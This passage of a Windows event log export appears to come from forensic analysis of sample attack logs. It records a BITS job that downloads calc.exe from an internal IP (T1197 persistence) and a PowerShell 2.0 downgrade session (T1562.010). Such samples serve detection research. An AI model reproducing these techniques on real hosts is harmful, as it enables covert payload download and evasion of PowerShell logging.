2,12,2021-06-13 06:17:18.0443734,3,Info,Microsoft-Windows-Bits-Client,Microsoft-Windows-Bits-Client/Operational,1140,1776,sv-dc.hinokabegakure-no-sato.local,0,S-1-5-18,BITS service created a new job,hns\Administrator,,jobTitle: test,jobId: 6f364a04-6299-4349-a8b6-34bed5e400ef,,,,,C:\Windows\System32\bitsadmin.exe,False,/evidence/windows-evtx-hayabusa-samples/Persistence/T1197_BitsClient.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""jobTitle"",""#text"":""test""},{""@Name"":""jobId"",""#text"":""6f364a04-6299-4349-a8b6-34bed5e400ef""},{""@Name"":""jobOwner"",""#text"":""hns\\Administrator""},{""@Name"":""processPath"",""#text"":""C:\\Windows\\System32\\bitsadmin.exe""},{""@Name"":""processId"",""#text"":""1020""}]}}"
3,13,2021-06-13 06:17:18.0566727,310,Warning,Microsoft-Windows-Bits-Client,Microsoft-Windows-Bits-Client/Operational,1140,2796,sv-dc.hinokabegakure-no-sato.local,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/Persistence/T1197_BitsClient.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":{""@Name"":""ErrorCode"",""#text"":""2147942450""}}}"
4,14,2021-06-13 06:17:18.0870544,59,Info,Microsoft-Windows-Bits-Client,Microsoft-Windows-Bits-Client/Operational,1140,2796,sv-dc.hinokabegakure-no-sato.local,0,S-1-5-18,BITS transfer has started,,,jobTitle: test,jobId: 6f364a04-6299-4349-a8b6-34bed5e400ef,URL: http://192.168.10.254:80/calc.exe,"Peer: ",Total Bytes: 32256 (Transferred: 0),Bytes Transferred from Peer: 0,,False,/evidence/windows-evtx-hayabusa-samples/Persistence/T1197_BitsClient.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""transferId"",""#text"":""837fb303-0b01-460e-9024-ff2f735b3c82""},{""@Name"":""name"",""#text"":""test""},{""@Name"":""Id"",""#text"":""6f364a04-6299-4349-a8b6-34bed5e400ef""},{""@Name"":""url"",""#text"":""http://192.168.10.254:80/calc.exe""},{""@Name"":""peer""},{""@Name"":""fileTime"",""#text"":""2021-05-19 02:42:52.0000000""},{""@Name"":""fileLength"",""#text"":""32256""},{""@Name"":""bytesTotal"",""#text"":""32256""},{""@Name"":""bytesTransferred"",""#text"":""0""},{""@Name"":""bytesTransferredFromPeer"",""#text"":""0""}]}}"
5,15,2021-06-13 06:17:28.3125975,60,Info,Microsoft-Windows-Bits-Client,Microsoft-Windows-Bits-Client/Operational,1140,1268,sv-dc.hinokabegakure-no-sato.local,0,S-1-5-18,BITS transfer has stopped,,,jobTitle: test,jobId: 6f364a04-6299-4349-a8b6-34bed5e400ef,URL: http://192.168.10.254:80/calc.exe,"Peer: ",Total Bytes: 32256 (Transferred: 32256),Bytes Transferred from Peer: 0,,False,/evidence/windows-evtx-hayabusa-samples/Persistence/T1197_BitsClient.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""transferId"",""#text"":""837fb303-0b01-460e-9024-ff2f735b3c82""},{""@Name"":""name"",""#text"":""test""},{""@Name"":""Id"",""#text"":""6f364a04-6299-4349-a8b6-34bed5e400ef""},{""@Name"":""url"",""#text"":""http://192.168.10.254:80/calc.exe""},{""@Name"":""peer""},{""@Name"":""hr"",""#text"":""0""},{""@Name"":""fileTime"",""#text"":""2021-05-19 02:42:52.0000000""},{""@Name"":""fileLength"",""#text"":""32256""},{""@Name"":""bytesTotal"",""#text"":""32256""},{""@Name"":""bytesTransferred"",""#text"":""32256""},{""@Name"":""proxy""},{""@Name"":""peerProtocolFlags"",""#text"":""0""},{""@Name"":""bytesTransferredFromPeer"",""#text"":""0""},{""@Name"":""AdditionalInfoHr"",""#text"":""0""},{""@Name"":""PeerContextInfo"",""#text"":""0""},{""@Name"":""bandwidthLimit"",""#text"":""18446744073709551615""},{""@Name"":""ignoreBandwidthLimitsOnLan"",""#text"":""False""}]}}"
6,16,2021-06-13 06:17:28.3341955,4,Info,Microsoft-Windows-Bits-Client,Microsoft-Windows-Bits-Client/Operational,1140,1268,sv-dc.hinokabegakure-no-sato.local,0,S-1-5-18,BITS job completion,hns\Administrator,,jobTitle: test,jobId: 6f364a04-6299-4349-a8b6-34bed5e400ef,fileCount: 1,jobOwner: hns\Administrator,Bytes Transferred: 32256,Bytes Transferred from Peer: 0,,False,/evidence/windows-evtx-hayabusa-samples/Persistence/T1197_BitsClient.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":[{""@Name"":""User"",""#text"":""hns\\Administrator""},{""@Name"":""jobTitle"",""#text"":""test""},{""@Name"":""jobId"",""#text"":""6f364a04-6299-4349-a8b6-34bed5e400ef""},{""@Name"":""jobOwner"",""#text"":""hns\\Administrator""},{""@Name"":""fileCount"",""#text"":""1""},{""@Name"":""bytesTransferred"",""#text"":""32256""},{""@Name"":""bytesTransferredFromPeer"",""#text"":""0""}]}}"
7,17,2021-06-13 06:19:28.3511197,308,Warning,Microsoft-Windows-Bits-Client,Microsoft-Windows-Bits-Client/Operational,1140,356,sv-dc.hinokabegakure-no-sato.local,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/Persistence/T1197_BitsClient.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":{""@Name"":""number"",""#text"":""3199.234""}}}"
705,705,2021-01-28 09:58:44.5230589,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"HostApplication=powershell calc","HostName=ConsoleHost","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Registry, Started, \tProviderName=Registry\n\tNewProviderState=Started\n\n\tSequenceNumber=1\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.18362.145\n\tHostId=64821494-0737-4ce9-ad67-3ac0e50a81b8\n\tHostApplication=powershell calc\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
706,706,2021-01-28 09:58:44.5230589,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"HostApplication=powershell calc","HostName=ConsoleHost","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Alias, Started, \tProviderName=Alias\n\tNewProviderState=Started\n\n\tSequenceNumber=3\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.18362.145\n\tHostId=64821494-0737-4ce9-ad67-3ac0e50a81b8\n\tHostApplication=powershell calc\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
707,707,2021-01-28 09:58:44.5230589,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"HostApplication=powershell calc","HostName=ConsoleHost","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Environment, Started, \tProviderName=Environment\n\tNewProviderState=Started\n\n\tSequenceNumber=5\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.18362.145\n\tHostId=64821494-0737-4ce9-ad67-3ac0e50a81b8\n\tHostApplication=powershell calc\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
708,708,2021-01-28 09:58:44.5387607,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"HostApplication=powershell calc","HostName=ConsoleHost","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""FileSystem, Started, \tProviderName=FileSystem\n\tNewProviderState=Started\n\n\tSequenceNumber=7\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.18362.145\n\tHostId=64821494-0737-4ce9-ad67-3ac0e50a81b8\n\tHostApplication=powershell calc\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
709,709,2021-01-28 09:58:44.5387607,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"HostApplication=powershell calc","HostName=ConsoleHost","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Function, Started, \tProviderName=Function\n\tNewProviderState=Started\n\n\tSequenceNumber=9\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.18362.145\n\tHostId=64821494-0737-4ce9-ad67-3ac0e50a81b8\n\tHostApplication=powershell calc\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
710,710,2021-01-28 09:58:44.5387607,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"HostApplication=powershell calc","HostName=ConsoleHost","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Variable, Started, \tProviderName=Variable\n\tNewProviderState=Started\n\n\tSequenceNumber=11\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.18362.145\n\tHostId=64821494-0737-4ce9-ad67-3ac0e50a81b8\n\tHostApplication=powershell calc\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
711,711,2021-01-28 09:58:44.5387607,400,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Engine state is changed from None to Available,,,"HostApplication=powershell calc","HostName=ConsoleHost","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Available, None, \tNewEngineState=Available\n\tPreviousEngineState=None\n\n\tSequenceNumber=13\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.18362.145\n\tHostId=64821494-0737-4ce9-ad67-3ac0e50a81b8\n\tHostApplication=powershell calc\n\tEngineVersion=5.1.18362.145\n\tRunspaceId=74ae21ca-7fa9-40cc-a265-7a41fdb168a6\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
712,712,2021-01-28 09:58:44.6482499,800,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Pipeline Execution Details,,,"HostApplication=powershell calc","HostName=ConsoleHost","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=15\n\n\tUserId=DESKTOP-ST69BPO\\user01\n\tHostName=ConsoleHost\n\tHostVersion=5.1.18362.145\n\tHostId=64821494-0737-4ce9-ad67-3ac0e50a81b8\n\tHostApplication=powershell calc\n\tEngineVersion=5.1.18362.145\n\tRunspaceId=74ae21ca-7fa9-40cc-a265-7a41fdb168a6\n\tPipelineId=1\n\tScriptName=\n\tCommandLine=, CommandInvocation(Out-Default): \""Out-Default\""\n"",""Binary"":""""}}"
713,713,2021-01-28 09:58:44.8355471,403,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Engine state is changed from Available to Stopped,,,"HostApplication=powershell calc","HostName=ConsoleHost","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Stopped, Available, \tNewEngineState=Stopped\n\tPreviousEngineState=Available\n\n\tSequenceNumber=17\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.18362.145\n\tHostId=64821494-0737-4ce9-ad67-3ac0e50a81b8\n\tHostApplication=powershell calc\n\tEngineVersion=5.1.18362.145\n\tRunspaceId=74ae21ca-7fa9-40cc-a265-7a41fdb168a6\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
714,714,2021-01-28 10:22:26.3668321,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"HostApplication=C:\Windows\System32\sdiagnhost.exe -Embedding","HostName=Default Host","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Registry, Started, \tProviderName=Registry\n\tNewProviderState=Started\n\n\tSequenceNumber=10\n\n\tHostName=Default Host\n\tHostVersion=5.1.18362.145\n\tHostId=00e06fdc-c31b-4d3a-ab93-1324abb766a7\n\tHostApplication=C:\\Windows\\System32\\sdiagnhost.exe -Embedding\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
715,715,2021-01-28 10:22:26.3826720,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"HostApplication=C:\Windows\System32\sdiagnhost.exe -Embedding","HostName=Default Host","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Alias, Started, \tProviderName=Alias\n\tNewProviderState=Started\n\n\tSequenceNumber=12\n\n\tHostName=Default Host\n\tHostVersion=5.1.18362.145\n\tHostId=00e06fdc-c31b-4d3a-ab93-1324abb766a7\n\tHostApplication=C:\\Windows\\System32\\sdiagnhost.exe -Embedding\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
716,716,2021-01-28 10:22:26.3826720,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"HostApplication=C:\Windows\System32\sdiagnhost.exe -Embedding","HostName=Default Host","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Environment, Started, \tProviderName=Environment\n\tNewProviderState=Started\n\n\tSequenceNumber=14\n\n\tHostName=Default Host\n\tHostVersion=5.1.18362.145\n\tHostId=00e06fdc-c31b-4d3a-ab93-1324abb766a7\n\tHostApplication=C:\\Windows\\System32\\sdiagnhost.exe -Embedding\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
717,717,2021-01-28 10:22:26.3826720,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"HostApplication=C:\Windows\System32\sdiagnhost.exe -Embedding","HostName=Default Host","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""FileSystem, Started, \tProviderName=FileSystem\n\tNewProviderState=Started\n\n\tSequenceNumber=16\n\n\tHostName=Default Host\n\tHostVersion=5.1.18362.145\n\tHostId=00e06fdc-c31b-4d3a-ab93-1324abb766a7\n\tHostApplication=C:\\Windows\\System32\\sdiagnhost.exe -Embedding\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
718,718,2021-01-28 10:22:26.3826720,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"HostApplication=C:\Windows\System32\sdiagnhost.exe -Embedding","HostName=Default Host","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Function, Started, \tProviderName=Function\n\tNewProviderState=Started\n\n\tSequenceNumber=18\n\n\tHostName=Default Host\n\tHostVersion=5.1.18362.145\n\tHostId=00e06fdc-c31b-4d3a-ab93-1324abb766a7\n\tHostApplication=C:\\Windows\\System32\\sdiagnhost.exe -Embedding\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
719,719,2021-01-28 10:22:26.3826720,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"HostApplication=C:\Windows\System32\sdiagnhost.exe -Embedding","HostName=Default Host","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Variable, Started, \tProviderName=Variable\n\tNewProviderState=Started\n\n\tSequenceNumber=20\n\n\tHostName=Default Host\n\tHostVersion=5.1.18362.145\n\tHostId=00e06fdc-c31b-4d3a-ab93-1324abb766a7\n\tHostApplication=C:\\Windows\\System32\\sdiagnhost.exe -Embedding\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
720,720,2021-01-28 10:22:26.3826720,400,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Engine state is changed from None to Available,,,"HostApplication=C:\Windows\System32\sdiagnhost.exe -Embedding","HostName=Default Host","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Available, None, \tNewEngineState=Available\n\tPreviousEngineState=None\n\n\tSequenceNumber=22\n\n\tHostName=Default Host\n\tHostVersion=5.1.18362.145\n\tHostId=00e06fdc-c31b-4d3a-ab93-1324abb766a7\n\tHostApplication=C:\\Windows\\System32\\sdiagnhost.exe -Embedding\n\tEngineVersion=5.1.18362.145\n\tRunspaceId=7d995610-1656-4675-a6fd-458a9f4f8b7c\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
721,721,2021-01-28 10:40:54.8693413,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"WSMan, Started, 	ProviderName=WSMan
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=2.0
	HostId=5cbb33bf-acf7-47cc-9242-141cd0ba9f0c
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","HostName=ConsoleHost","HostVersion=2.0",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""WSMan, Started, \tProviderName=WSMan\n\tNewProviderState=Started\n\n\tSequenceNumber=1\n\n\tHostName=ConsoleHost\n\tHostVersion=2.0\n\tHostId=5cbb33bf-acf7-47cc-9242-141cd0ba9f0c\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
722,722,2021-01-28 10:40:54.8693413,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"Alias, Started, 	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=2

	HostName=ConsoleHost
	HostVersion=2.0
	HostId=5cbb33bf-acf7-47cc-9242-141cd0ba9f0c
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","HostName=ConsoleHost","HostVersion=2.0",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Alias, Started, \tProviderName=Alias\n\tNewProviderState=Started\n\n\tSequenceNumber=2\n\n\tHostName=ConsoleHost\n\tHostVersion=2.0\n\tHostId=5cbb33bf-acf7-47cc-9242-141cd0ba9f0c\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
723,723,2021-01-28 10:40:54.8844424,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"Environment, Started, 	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=2.0
	HostId=5cbb33bf-acf7-47cc-9242-141cd0ba9f0c
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","HostName=ConsoleHost","HostVersion=2.0",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Environment, Started, \tProviderName=Environment\n\tNewProviderState=Started\n\n\tSequenceNumber=3\n\n\tHostName=ConsoleHost\n\tHostVersion=2.0\n\tHostId=5cbb33bf-acf7-47cc-9242-141cd0ba9f0c\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
724,724,2021-01-28 10:40:54.8844424,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"FileSystem, Started, 	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=4

	HostName=ConsoleHost
	HostVersion=2.0
	HostId=5cbb33bf-acf7-47cc-9242-141cd0ba9f0c
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","HostName=ConsoleHost","HostVersion=2.0",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""FileSystem, Started, \tProviderName=FileSystem\n\tNewProviderState=Started\n\n\tSequenceNumber=4\n\n\tHostName=ConsoleHost\n\tHostVersion=2.0\n\tHostId=5cbb33bf-acf7-47cc-9242-141cd0ba9f0c\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
725,725,2021-01-28 10:40:54.8844424,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"Function, Started, 	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=2.0
	HostId=5cbb33bf-acf7-47cc-9242-141cd0ba9f0c
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","HostName=ConsoleHost","HostVersion=2.0",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Function, Started, \tProviderName=Function\n\tNewProviderState=Started\n\n\tSequenceNumber=5\n\n\tHostName=ConsoleHost\n\tHostVersion=2.0\n\tHostId=5cbb33bf-acf7-47cc-9242-141cd0ba9f0c\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
726,726,2021-01-28 10:40:54.8844424,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"Registry, Started, 	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=6

	HostName=ConsoleHost
	HostVersion=2.0
	HostId=5cbb33bf-acf7-47cc-9242-141cd0ba9f0c
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","HostName=ConsoleHost","HostVersion=2.0",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Registry, Started, \tProviderName=Registry\n\tNewProviderState=Started\n\n\tSequenceNumber=6\n\n\tHostName=ConsoleHost\n\tHostVersion=2.0\n\tHostId=5cbb33bf-acf7-47cc-9242-141cd0ba9f0c\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
727,727,2021-01-28 10:40:54.8844424,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"Variable, Started, 	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=2.0
	HostId=5cbb33bf-acf7-47cc-9242-141cd0ba9f0c
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","HostName=ConsoleHost","HostVersion=2.0",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Variable, Started, \tProviderName=Variable\n\tNewProviderState=Started\n\n\tSequenceNumber=7\n\n\tHostName=ConsoleHost\n\tHostVersion=2.0\n\tHostId=5cbb33bf-acf7-47cc-9242-141cd0ba9f0c\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
728,728,2021-01-28 10:40:54.8844424,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"Certificate, Started, 	ProviderName=Certificate
	NewProviderState=Started

	SequenceNumber=8

	HostName=ConsoleHost
	HostVersion=2.0
	HostId=5cbb33bf-acf7-47cc-9242-141cd0ba9f0c
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","HostName=ConsoleHost","HostVersion=2.0",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Certificate, Started, \tProviderName=Certificate\n\tNewProviderState=Started\n\n\tSequenceNumber=8\n\n\tHostName=ConsoleHost\n\tHostVersion=2.0\n\tHostId=5cbb33bf-acf7-47cc-9242-141cd0ba9f0c\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
729,729,2021-01-28 10:40:54.8844424,400,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Engine state is changed from None to Available,,,"Available, None, 	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=2.0
	HostId=5cbb33bf-acf7-47cc-9242-141cd0ba9f0c
	EngineVersion=2.0
	RunspaceId=c6e94dca-0daf-418c-860a-f751a9f2cbe1
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","HostName=ConsoleHost","HostVersion=2.0",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Available, None, \tNewEngineState=Available\n\tPreviousEngineState=None\n\n\tSequenceNumber=9\n\n\tHostName=ConsoleHost\n\tHostVersion=2.0\n\tHostId=5cbb33bf-acf7-47cc-9242-141cd0ba9f0c\n\tEngineVersion=2.0\n\tRunspaceId=c6e94dca-0daf-418c-860a-f751a9f2cbe1\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
730,730,2021-01-28 10:40:54.9468666,403,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Engine state is changed from Available to Stopped,,,"Stopped, Available, 	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=10

	HostName=ConsoleHost
